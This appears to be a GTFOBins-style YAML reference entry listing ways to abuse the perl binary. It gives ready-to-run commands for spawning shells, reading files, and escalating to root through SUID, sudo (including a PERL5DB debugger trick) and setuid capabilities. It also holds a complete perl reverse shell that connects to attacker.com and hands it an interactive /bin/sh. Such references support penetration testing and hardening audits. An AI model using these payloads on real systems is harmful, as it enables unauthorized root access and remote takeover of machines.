---
functions:
  shell:
    - code: perl -e 'exec "/bin/sh";'
  file-read:
    - code: |
        LFILE=file_to_read
        perl -ne print $LFILE
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  suid:
    - code: ./perl -e 'exec "/bin/sh";'
  sudo:
    - code: sudo perl -e 'exec "/bin/sh";'
    - description: Don't forget to `CTRL+D` to exit the perl shell and get the shell.
      code: sudo PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl
  capabilities:
    - code: ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
---
